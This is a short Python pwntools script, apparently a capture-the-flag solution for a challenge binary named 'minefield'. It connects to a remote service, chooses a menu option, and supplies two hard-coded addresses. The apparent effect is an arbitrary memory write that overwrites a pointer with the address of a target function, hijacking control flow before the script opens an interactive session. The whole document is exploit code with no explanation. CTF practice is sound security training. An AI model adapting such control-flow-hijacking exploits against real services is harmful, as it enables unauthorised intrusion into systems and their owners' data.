from pwn import *

#r = process(["./minefield"])
r = remote(...)
r.sendlineafter("> ", "2")
r.sendlineafter(": ", str(0x601078))
r.sendlineafter(": ", str(0x0040096b))

r.interactive()
